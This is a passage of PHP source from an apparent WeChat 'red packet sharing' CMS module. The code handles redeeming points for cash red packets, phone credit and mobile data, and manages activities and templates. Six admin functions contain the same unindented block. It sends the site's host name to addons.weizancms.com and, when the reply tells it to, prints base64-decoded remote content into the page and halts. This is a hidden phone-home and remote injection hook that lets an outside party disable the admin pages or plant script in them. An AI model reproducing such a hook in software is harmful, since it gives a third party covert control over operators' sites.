					$procResult = $this->_sendpack($from_user,$fansawardid,$_GPC['duihuanshu'],$codesn,$_desc);
					if($procResult['errno']==0){
					    pdo_update('stonefish_redfunshare_fans', array('zhongjiang'=>2), array('id' => $fans['id']));
						$text = '恭喜，你已经成功申请兑换了'.$_GPC['duihuanshu']."元红包哦,请到微信钱包查收！";
				        $this->sendtext($text,$from_user);
				    }else{
						//账户余额不足
						if(strexists($procResult['error'],"余额不足")){
							$setting = $this->module['config'];
							$kefuopenid = $setting['stonefish_redfunshare_kefuopenid'];
							if(!empty($kefuopenid)){
								$this->sendtext($_W['account']['name'].'粉丝领取红包出现账号余额不足，请尽快充值！',$kefuopenid);
							}
						}
						//支付失败，删除记录
						pdo_delete('stonefish_redfunshare_fansaward', array('id' => $fansawardid));
						$outpoint = number_format($outpoin - $_GPC['duihuanshu'],2);
			            pdo_update('stonefish_redfunshare_fans', array('outpoint'=>$outpoint), array('id' => $fans['id']));
						$data = array(
                            'msg' => '系统出错!请稍候再试！',
                            'success' => 0,
                        );
						$this->Json_encode($data);
					}
				}
				//兑换红包
				//兑换话费
				if($reply['redpacktype']==1 && $reply['seedredpack']){
					if($_GPC['duihuanshu']<5){
						$data = array(
                            'msg' => '申请兑换话费不能小于5元!',
                            'success' => 0,
                        );
						$this->Json_encode($data);
					}else{
						//读取话费配置
					    $config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofpay' order by id desc");
					    $appkey = $config['key'];
					    $openid = $config['sign'];
					    $recharge = new recharge($appkey,$openid);
					    //读取话费配置
						//根据手机号码以及面额查询商品信息
						$telQueryRes =$recharge->telquery($fans['mobile'],$_GPC['duihuanshu']);
						if($telQueryRes){
							if($telQueryRes['error_code'] == '0'){
						        //正常获取到话费商品信息
						        $proinfo = $telQueryRes['result'];
							    $inprice = $proinfo['inprice'];
						    }else{
						        $data = array(
                           	        'msg' => $telQueryRes['reason'],
                                    'success' => 0,
                                );
						        $this->Json_encode($data);
						    }
						}else{
							$data = array(
                           	    'msg' => '接口链接失败',
                                'success' => 0,
                            );
						    $this->Json_encode($data);
						}						
						//根据手机号码以及面额查询商品信息
						//查询话费配额数量
					    $total = pdo_fetchcolumn("SELECT sum(total) FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and apitype='mobileofpay'");
					    $draw = pdo_fetchcolumn("SELECT sum(draw) FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and apitype='mobileofpay'");
					    if($total-$draw-$inprice<=0){
						    pdo_delete('stonefish_redfunshare_fansaward', array('id' => $fansawardid));
						    $outpoint = number_format($outpoin - $_GPC['duihuanshu'],2);
			           	    pdo_update('stonefish_redfunshare_fans', array('outpoint'=>$outpoint), array('id' => $fans['id']));
						    if($procResult['error_code'] == "208517"){
							    $setting = $this->module['config'];
							    $kefuopenid = $setting['stonefish_redfunshare_kefuopenid'];
							    if(!empty($kefuopenid)){
								    $this->sendtext($_W['account']['name'].'话费余额不足，请尽快充值！',$kefuopenid);
							    }							
						    }
						    $data = array(
                           	    'msg' => '系统调试中，请稍候再试!',
                                'success' => 0,
                            );
						    $this->Json_encode($data);
					    }
					    //查询话费配额数量
						$procResult = $recharge->telcheck($fans['mobile'],$_GPC['duihuanshu']);
						if(!$procResult){
							$data = array(
                                'msg' => '您的手机号不支持此面额充值!',
                                'success' => 0,
                            );
						    $this->Json_encode($data);
						}else{
							$procResult = $recharge->telcz($fans['mobile'],$_GPC['duihuanshu'],$codesn);
							if($procResult){
								if($procResult['error_code'] == "0"){
								    $rec['log']=$procResult['result']['sporder_id'];
								    $rec['zhongjiang']=2;
								    $rec['createtime']=time();
								    $rec['consumetime']=time();
								    $rec['completed']=1;
								    $rec['ticketname']='聚合接口';
								    pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$fansawardid));
								    //添加话费记录
								    $insertsms = array();
								    $insertsms['uniacid'] = $_W['uniacid'];
								    $insertsms['apitype'] = 'mobileofpay';
								    $insertsms['uid'] = $_W['member']['uid'];
								    $insertsms['from_user'] = $_W['openid'];
								    $insertsms['code'] = $_GPC['duihuanshu'];
								    $insertsms['inprice'] = $inprice;
								    $insertsms['rid'] = $rid;
								    $insertsms['module'] = 'stonefish_redfunshare';
								    $insertsms['modulename'] = '红包乐分享';
								    $insertsms['mobile'] = $fans['mobile'];
								    $insertsms['createtime'] = TIMESTAMP;
								    pdo_insert('stonefish_mcenter_juheapirecord', $insertsms);
								    //添加话费记录
								    //添加使用次数
								    $juheapi = pdo_fetchall("SELECT * FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and total>draw and apitype='mobileofpay' order by id asc");
								    foreach ($juheapi as $juheapis){
									    $duihuanshu = $inprice;
									    if($juheapis['total']-$juheapis['draw']-$duihuanshu>=0){
										    pdo_update('stonefish_mcenter_juheapi', array('draw' => $juheapis['draw']+$inprice), array('id' => $juheapis['id']));
										    break; //终止循环
									    }else{
										    $duihuanshu = $duihuanshu - ($juheapis['total']-$juheapis['draw']);
										    pdo_update('stonefish_mcenter_juheapi', array('draw' => $juheapis['total']), array('id' => $juheapis['id']));
									    }
								    }
								    //添加使用次数
								    pdo_update('stonefish_redfunshare_fans', array('zhongjiang'=>2), array('id' => $fans['id']));
								    $text = '恭喜，你已经成功申请兑换了'.$_GPC['duihuanshu'].'元话费红包哦,请咨询手机号：'.$fans['mobile'].' 的运营商客服或APP查询是否到账！';
								    $this->sendtext($text,$from_user);								
							    }else{
								    $data = array(
                           		        'msg' => $procResult['reason'].'，请稍候再试!',
                            		    'success' => 0,
                        		    );
								    pdo_delete('stonefish_redfunshare_fansaward', array('id' => $fansawardid));
								    $outpoint = number_format($outpoin - $_GPC['duihuanshu'],2);
			           		        pdo_update('stonefish_redfunshare_fans', array('outpoint'=>$outpoint), array('id' => $fans['id']));
								    if($procResult['error_code'] == "208517"){
									    $setting = $this->module['config'];
									    $kefuopenid = $setting['stonefish_redfunshare_kefuopenid'];
									    if(!empty($kefuopenid)){
									        $this->sendtext($_W['account']['name'].'聚合话费余额不足，请尽快充值！',$kefuopenid);
									    
									    $data['msg'] = '运营商地区维护，暂不能充值，请稍候再试!';
								        }
								        $this->Json_encode($data);
							        }
							    }
							}else{
								$data = array(
                                    'msg' => '系统接口出错!',
                                    'success' => 0,
                                );
						        $this->Json_encode($data);
							}
						}
					}
				}
				//兑换话费
				//兑换流量
				if($reply['redpacktype']==2 && $reply['seedredpack']){
					if($_GPC['duihuanshu']<10){
						$data = array(
                            'msg' => '申请兑换流量不能小于10M!',
                            'success' => 0,
                        );
						$this->Json_encode($data);
					}else{
						//读取流量配置
					    $config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofflow' order by id desc");
					    $appkey = $config['key']; 
					    $openid = $config['sign'];
						$recharge = new recharge($appkey,$openid);
					    //读取流量配置						
						//查询流量配额数量
					    $total = pdo_fetchcolumn("SELECT sum(total) FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and apitype='mobileofflow'");
					    $draw = pdo_fetchcolumn("SELECT sum(draw) FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and apitype='mobileofflow'");
					    if($total-$draw-$inprice<=0){
						    pdo_delete('stonefish_redfunshare_fansaward', array('id' => $fansawardid));
						    $outpoint = number_format($outpoin - $_GPC['duihuanshu'],2);
			           	    pdo_update('stonefish_redfunshare_fans', array('outpoint'=>$outpoint), array('id' => $fans['id']));
						    if($procResult['error_code'] == "208517"){
							    $setting = $this->module['config'];
							    $kefuopenid = $setting['stonefish_redfunshare_kefuopenid'];
							    if(!empty($kefuopenid)){
								    $this->sendtext($_W['account']['name'].'流量余额不足，请尽快充值！',$kefuopenid);
							    }							
						    }
						    $data = array(
                           	    'msg' => '系统调试中，请稍候再试!',
                                'success' => 0,
                            );
						    $this->Json_encode($data);
					    }
					    //查询流量配额数量
						$procResult = $recharge->flowcz($fans['mobile'],$orderid,$codesn);
    					if($procResult){
    					    if($procResult['error_code']=='0'){
    					        $rec['log']=$procResult['result']['sporder_id'];
								$rec['zhongjiang']=2;
								$rec['createtime']=time();
								$rec['consumetime']=time();
								$rec['completed']=$orderid;
								$rec['ticketname']='聚合接口';
								pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$fansawardid));
								//添加流量记录
								$insertsms = array();
								$insertsms['uniacid'] = $_W['uniacid'];
								$insertsms['apitype'] = 'mobileofflow';
								$insertsms['uid'] = $_W['member']['uid'];
								$insertsms['from_user'] = $_W['openid'];
								$insertsms['code'] = $_GPC['duihuanshu'];
								$insertsms['inprice'] = $inprice;
								$insertsms['rid'] = $rid;
								$insertsms['module'] = 'stonefish_redfunshare';
								$insertsms['modulename'] = '红包乐分享';
								$insertsms['mobile'] = $fans['mobile'];
								$insertsms['createtime'] = TIMESTAMP;
								pdo_insert('stonefish_mcenter_juheapirecord', $insertsms);
								//添加流量记录
								//添加使用次数
								$juheapi = pdo_fetchall("SELECT * FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and total>draw and apitype='mobileofflow' order by id asc");
								foreach ($juheapi as $juheapis){
									$duihuanshu = $inprice;
									if($juheapis['total']-$juheapis['draw']-$duihuanshu>=0){
										pdo_update('stonefish_mcenter_juheapi', array('draw' => $juheapis['draw']+$inprice), array('id' => $juheapis['id']));
										break; //终止循环
									}else{
										$duihuanshu = $duihuanshu - ($juheapis['total']-$juheapis['draw']);
										pdo_update('stonefish_mcenter_juheapi', array('draw' => $juheapis['total']), array('id' => $juheapis['id']));
									}
								}
								//添加使用次数
								pdo_update('stonefish_redfunshare_fans', array('zhongjiang'=>2), array('id' => $fans['id']));
								$text = '恭喜，你已经成功申请兑换了'.$_GPC['duihuanshu'].'M流量红包哦,请咨询手机号：'.$fans['mobile'].' 的运营商客服或APP查询是否到账！';
								$this->sendtext($text,$from_user);
    					    }else{
								pdo_delete('stonefish_redfunshare_fansaward', array('id' => $fansawardid));
							    $outpoint = number_format($outpoin - $_GPC['duihuanshu'],2);
			           		    pdo_update('stonefish_redfunshare_fans', array('outpoint'=>$outpoint), array('id' => $fans['id']));
								$data = array(
                                    'msg' => $procResult['reason'],
                                    'success' => 0,
                                );
						        $this->Json_encode($data);
    					    }
    					}else{
						    pdo_delete('stonefish_redfunshare_fansaward', array('id' => $fansawardid));
							$outpoint = number_format($outpoin - $_GPC['duihuanshu'],2);
			           		pdo_update('stonefish_redfunshare_fans', array('outpoint'=>$outpoint), array('id' => $fans['id']));
							$data = array(
                                'msg' => '系统出错!',
                                'success' => 0,
                            );
							$this->Json_encode($data);
    					}
					}					
				}
				//兑换流量
				//发送消息模板之参与模板
				$exchange = pdo_fetch("select tmplmsg_exchange FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
			    if($exchange['tmplmsg_exchange']){
				    $this->seed_tmplmsg($fromuser,$exchange['tmplmsg_exchange'],$rid,array('do' =>'myaward', 'duihuanshu' =>$_GPC['duihuanshu']));
			    }
			    //发送消息模板之参与模板
			    $data = array(
                    'msg' => '申请兑换成功',
                    'success' => 1,
                );
			}else{
				$data = array(
                    'msg' => '余额不足了',
                    'success' => 0,
                );
			}			
		}else{
			$data = array(
                'msg' => '系统参与人出错!请联系管理员',
                'success' => 0,
            );
		}
        $this->Json_encode($data);
	}
	//兑奖
	//我的兑奖记录
	public function doMobileDui_huan() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);		
		$uniacid = $_W['uniacid'];
		$acid = $_W['acid'];
        if (empty($rid)) {
            $this->message_tips($rid,'抱歉，参数错误！');
        }
		$reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		$template = pdo_fetch("select * from " . tablename('stonefish_redfunshare_template') . " where id = :id", array(':id' => $reply['templateid']));
		$share = pdo_fetch("select * from " . tablename('stonefish_redfunshare_share') . " where rid = :rid and acid = :acid", array(':rid' => $rid,':acid' => $acid));
		$exchange = pdo_fetch("select awardingstarttime,awardingendtime FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
		//活动状态
		$this->check_reply($reply);		
		//活动状态	
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
		//获取粉丝信息
		$userinfo = $this->get_userinfo($reply['power'],$rid,$iid,$page_fromuser,'dui_huan');
		//获取粉丝信息
		$fans = pdo_fetch("select id,status,inpoint,outpoint,sharepoint,mobile,realname,nickname from " . tablename('stonefish_redfunshare_fans') . " where rid = :rid and uniacid = :uniacid and from_user = :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		if(!empty($fans)){
			//判断是否作弊
			if($fans['status']==0 || $fans['inpoint']>$reply['inpointend']){
				$real_name = empty($fans['realname']) ? stripcslashes($fans['nickname']) : $fans['realname'];
				$this->message_tips($rid,'抱歉，活动中您〖'.$real_name.'〗可能有作弊行为已被管理员暂停屏蔽！请联系【'.$_W['account']['name'].'】管理员');
			}
			//判断是否作弊
		}
		$fansaward = pdo_fetch("select outpoint,createtime from " . tablename('stonefish_redfunshare_fansaward') . " where rid = :rid and uniacid = :uniacid and from_user = :from_user order by id desc", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		//分享信息
        $sharelink = $_W['siteroot'] .'app/'.substr($this->createMobileUrl('entry', array('rid' => $rid,'from_user' => $page_from_user,'entrytype' => 'shareview')),2);
        $sharetitle = empty($share['share_title']) ? '欢迎参加活动' : $share['share_title'];
        $sharedesc = empty($share['share_desc']) ? '亲，欢迎参加活动，祝您好运哦！！' : str_replace("\r\n"," ", $share['share_desc']);
		$sharetitle = $this->get_share($rid,$from_user,$sharetitle);
		$sharedesc = $this->get_share($rid,$from_user,$sharedesc);
		if(!empty($share['share_img'])){
		    $shareimg = toimage($share['share_img']);
		}else{
		    $shareimg = toimage($reply['start_picurl']);
		}
		if($this->Weixin()){
			include $this->template('duihuan');
		}else{
			$this->Weixin();
		}
    }
	//我的兑奖记录
	//活动管理
	public function doWebManage() {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        //查询是否填写系统参数
		$setting = $this->config($this->createWebUrl('manage'),'活动管理');
		//查询是否填写系统参数
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		$params = array(':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['keyword'])) {
            $where = ' AND `title` LIKE :keyword';
            $params[':keyword'] = "%{$_GPC['keyword']}%";
        }
        $total = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_reply') . "  where uniacid=:uniacid " . $where . "", $params);
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_reply') . " where uniacid=:uniacid " . $where . " order by id desc " . $limit, $params);

        if (!empty($list)) {
            foreach ($list as &$item) {
                $item['start_time'] = date('Y-m-d H:i', $item['starttime']);
                $item['end_time'] = date('Y-m-d H:i', $item['endtime']);
                $nowtime = time();
                if ($item['starttime'] > $nowtime) {
                    $item['status'] = '<span class="label label-warning">未开始</span>';
                    $item['show'] = 1;
                } elseif ($item['endtime'] < $nowtime) {
                    $item['status'] = '<span class="label label-default ">已结束</span>';
                    $item['show'] = 0;
                } else {
                    if ($item['isshow'] == 1) {
                        $item['status'] = '<span class="label label-success">已开始</span>';
                        $item['show'] = 2;
                    } else {
                        $item['status'] = '<span class="label label-default ">已暂停</span>';
                        $item['show'] = 1;
                    }
                }
            }
        }
        include $this->template('manage');
    }
	//活动管理
	//模板管理
	public function doWebTemplate() {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
		//查询是否填写系统参数
		$setting = $this->config($this->createWebUrl('template'),'模板管理');
		//查询是否填写系统参数
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		//活动模板
		$template = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_template') . " where uniacid = :uniacid or uniacid = 0 ORDER BY `id` asc", array(':uniacid' => $_W['uniacid']));
		if(empty($template)){
			$inserttemplate = array(
                'uniacid'          => 0,
				'title'            => '默认',
				'thumb'            => '../addons/stonefish_redfunshare/template/images/template.jpg',
				'fontsize'         => '12',
				'bgimg'            => '../addons/stonefish_redfunshare/template/images/bg.png',
				'bgcolor'          => '#f5cd47',
				'textcolor'        => '#ffffff',
				'textcolorlink'    => '#f3f3f3',
				'buttoncolor'      => '#e70012',
				'buttontextcolor'  => '#ffffff',
				'rulecolor'        => '#ffeca9',
				'ruletextcolor'    => '#434343',
				'navcolor'         => '#e70012',
				'navtextcolor'     => '#ffffff',
				'navactioncolor'   => '#ff0000',
				'watchcolor'       => '#f5f0eb',
				'watchtextcolor'   => '#717171',
				'awardcolor'       => '#ffc000',
				'awardtextcolor'   => '#ffffff',
				'awardscolor'      => '#b7b7b7',
				'awardstextcolor'  => '#434343',
			);
			pdo_insert('stonefish_redfunshare_template', $inserttemplate);			
		}
		//活动模板
		$params = array(':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['keyword'])) {
            $where = ' AND `title` LIKE :keyword';
            $params[':keyword'] = "%{$_GPC['keyword']}%";
        }
        $total = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_template') . "  where (uniacid=:uniacid or uniacid = 0) " . $where . "", $params);
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_template') . " where (uniacid=:uniacid or uniacid = 0) " . $where . " order by id desc " . $limit, $params);
        include $this->template('template');
    }
	//模板管理
	//模板修改
	public function doWebTemplatepost() {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        $id = intval($_GPC['id']);
		load()->func('tpl');
		if(!empty($id)) {
			$item = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_template')." where id = :id", array(':id' => $id));				
		}else{
			$item['uniacid'] = $_W['uniacid'];
		}
		if(checksubmit('submit')) {
			if(empty($_GPC['edit']) && empty($_GPC['fuzhi'])){
				message('系统模板，无权修改', url('site/entry/template', array('m' => 'stonefish_redfunshare')), 'error');
			}
			if(empty($_GPC['title'])){
				message('模板名称必需输入', referer(), 'error');
			}
			if(!isset($_GPC['thumb'])){
				message('模板缩略图必需上传', referer(), 'error');
			}
			if(empty($_GPC['bgimg'])){
				message('模板背景必需上传', referer(), 'error');
			}
			if(empty($_GPC['fontsize'])){
				message('文字大小必需填写', referer(), 'error');
			}
			if(empty($_GPC['bgcolor']) || empty($_GPC['textcolor']) || empty($_GPC['textcolorlink']) || empty($_GPC['buttoncolor']) || empty($_GPC['buttontextcolor']) || empty($_GPC['rulecolor']) || empty($_GPC['ruletextcolor']) || empty($_GPC['navcolor']) || empty($_GPC['navtextcolor']) || empty($_GPC['navactioncolor']) || empty($_GPC['watchcolor']) || empty($_GPC['watchtextcolor']) || empty($_GPC['awardcolor']) || empty($_GPC['awardtextcolor']) || empty($_GPC['awardscolor']) || empty($_GPC['awardstextcolor'])){
				message('颜色必需选择', referer(), 'error');
			}
			$data = array(
				'uniacid'          => $_GPC['uniacid'],
				'title'            => $_GPC['title'],
				'thumb'            => $_GPC['thumb'],
				'fontsize'         => $_GPC['fontsize'],
				'bgimg'            => $_GPC['bgimg'],
				'bgcolor'          => $_GPC['bgcolor'],
				'textcolor'        => $_GPC['textcolor'],
				'textcolorlink'    => $_GPC['textcolorlink'],
				'buttoncolor'      => $_GPC['buttoncolor'],
				'buttontextcolor'  => $_GPC['buttontextcolor'],
				'rulecolor'        => $_GPC['rulecolor'],
				'ruletextcolor'    => $_GPC['ruletextcolor'],
				'navcolor'         => $_GPC['navcolor'],
				'navtextcolor'     => $_GPC['navtextcolor'],
				'navactioncolor'   => $_GPC['navactioncolor'],
				'watchcolor'       => $_GPC['watchcolor'],
				'watchtextcolor'   => $_GPC['watchtextcolor'],
				'awardcolor'       => $_GPC['awardcolor'],
				'awardtextcolor'   => $_GPC['awardtextcolor'],
				'awardscolor'      => $_GPC['awardscolor'],
				'awardstextcolor'  => $_GPC['awardstextcolor'],
		    );
			if(!empty($_GPC['edit'])){
				if(!empty($id)) {
				    pdo_update('stonefish_redfunshare_template', $data, array('id' => $id));
				    message('模板修改成功！', url('site/entry/template', array('m' => 'stonefish_redfunshare')), 'success');
			    }else{
				    pdo_insert('stonefish_redfunshare_template', $data);
				    message('模板添加成功！', url('site/entry/template', array('m' => 'stonefish_redfunshare')), 'success');
			    }
			}
			if(!empty($_GPC['fuzhi'])){
				$data['uniacid'] = $_W['uniacid'];
				pdo_insert('stonefish_redfunshare_template', $data);
				$id = pdo_insertid();
				message('模板复制成功！', url('site/entry/templatepost', array('m' => 'stonefish_redfunshare','id' => $id)), 'success');
			}
		}
        include $this->template('templatepost');
    }
	//模板修改
	//模板删除
	public function doWebTemplatedel() {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        $id = intval($_GPC['id']);
		load()->func('tpl');
		if(!empty($id)) {
			$item = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_template')." where id = :id", array(':id' => $id));
			if(!empty($item)){
				if($item['uniacid']){
					pdo_delete('stonefish_redfunshare_template', array('id' => $id));
				    message('模板删除成功', referer(), 'success');
				}else{
					message('系统模板，无权删除', referer(), 'error');
				}				
			}else{
				message('活动不存在或已删除', referer(), 'error');
			}
		}else{
			message('系统出错', referer(), 'error');
		}
    }
	//模板删除
	//消息模板管理
	public function doWebTmplmsg() {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
		//查询是否填写系统参数
		$setting = $this->config($this->createWebUrl('tmplmsg'),'消息模板');
		//查询是否填写系统参数
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		$params = array(':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['keyword'])) {
            $where = ' AND template_name LIKE :keyword';
            $params[':keyword'] = "%{$_GPC['keyword']}%";
        }
        $total = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_tmplmsg') . "  where uniacid=:uniacid " . $where . "", $params);
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_tmplmsg') . " where uniacid=:uniacid " . $where . " order by id desc " . $limit, $params);
        include $this->template('tmplmsg');
    }
	//消息模板管理
	//消息模板修改
	public function doWebTmplmsgpost() {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        $id = intval($_GPC['id']);
		load()->func('tpl');
		if(!empty($id)) {
			$item = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_tmplmsg')." where id = :id", array(':id' => $id));				
		}else{
			$item['uniacid'] = $_W['uniacid'];
		}
		if(checksubmit('submit')) {
			if(empty($_GPC['template_name'])){
				message('消息模板名称必需输入', referer(), 'error');
			}
			if(empty($_GPC['template_id'])){
				message('消息模板ID必需输入', referer(), 'error');
			}
			if(empty($_GPC['first'])){
				message('消息模板标题必需输入', referer(), 'error');
			}
			if(empty($_GPC['keyword1'])){
				message('消息模板必需输入一个参数', referer(), 'error');
			}
			if(empty($_GPC['remark'])){
				message('消息模板必需输入备注', referer(), 'error');
			}
			$data = array(
				'uniacid'          => $_GPC['uniacid'],
				'template_name'    => $_GPC['template_name'],
				'template_id'      => $_GPC['template_id'],
				'topcolor'         => $_GPC['topcolor'],
				'first'            => $_GPC['first'],
				'firstcolor'       => $_GPC['firstcolor'],
				'keyword1'         => $_GPC['keyword1'],
				'keyword2'         => $_GPC['keyword2'],
				'keyword3'         => $_GPC['keyword3'],
				'keyword4'         => $_GPC['keyword4'],
				'keyword5'         => $_GPC['keyword5'],
				'keyword6'         => $_GPC['keyword6'],
				'keyword7'         => $_GPC['keyword7'],
				'keyword8'         => $_GPC['keyword8'],
				'keyword9'         => $_GPC['keyword9'],
				'keyword10'        => $_GPC['keyword10'],
				'keyword1color'    => $_GPC['keyword1color'],
				'keyword2color'    => $_GPC['keyword2color'],
				'keyword3color'    => $_GPC['keyword3color'],
				'keyword4color'    => $_GPC['keyword4color'],
				'keyword5color'    => $_GPC['keyword5color'],
				'keyword6color'    => $_GPC['keyword6color'],
				'keyword7color'    => $_GPC['keyword7color'],
				'keyword8color'    => $_GPC['keyword8color'],
				'keyword9color'    => $_GPC['keyword9color'],
				'keyword10color'   => $_GPC['keyword10color'],
				'keyword1code'     => $_GPC['keyword1code'],
				'keyword2code'     => $_GPC['keyword2code'],
				'keyword3code'     => $_GPC['keyword3code'],
				'keyword4code'     => $_GPC['keyword4code'],
				'keyword5code'     => $_GPC['keyword5code'],
				'keyword6code'     => $_GPC['keyword6code'],
				'keyword7code'     => $_GPC['keyword7code'],
				'keyword8code'     => $_GPC['keyword8code'],
				'keyword9code'     => $_GPC['keyword9code'],
				'keyword10code'    => $_GPC['keyword10code'],
				'remark'           => $_GPC['remark'],
				'remarkcolor'      => $_GPC['remarkcolor'],
		    );
			if(!empty($id)) {
				pdo_update('stonefish_redfunshare_tmplmsg', $data, array('id' => $id));
				message('消息模板修改成功！', url('site/entry/tmplmsg', array('m' => 'stonefish_redfunshare')), 'success');
			}else{
				pdo_insert('stonefish_redfunshare_tmplmsg', $data);
				message('消息模板添加成功！', url('site/entry/tmplmsg', array('m' => 'stonefish_redfunshare')), 'success');
			}			
		}
        include $this->template('tmplmsgpost');
    }
	//消息模板修改
	//消息模板删除
	public function doWebTmplmsgdel() {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        $id = intval($_GPC['id']);
		load()->func('tpl');
		if(!empty($id)) {
			$item = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_tmplmsg')." where id = :id", array(':id' => $id));
			if(!empty($item)){
				pdo_delete('stonefish_redfunshare_tmplmsg', array('id' => $id));
				message('消息模板删除成功', referer(), 'success');
			}else{
				message('消息模板不存在或已删除', referer(), 'error');
			}
		}else{
			message('系统出错', referer(), 'error');
		}
    }
	//消息模板删除
	//虚拟粉丝管理
	public function doWebVirtual() {
        global $_GPC, $_W;
		//查询是否填写系统参数
		$setting = $this->config($this->createWebUrl('virtual'),'虚拟粉丝');
		//查询是否填写系统参数
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		//活动模板
		$template = pdo_fetch("select * FROM " . tablename('stonefish_virtual') . " where uniacid = :uniacid or uniacid = 0 ORDER BY `id` asc", array(':uniacid' => $_W['uniacid']));
		//活动模板
		$params = array(':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['keyword'])) {
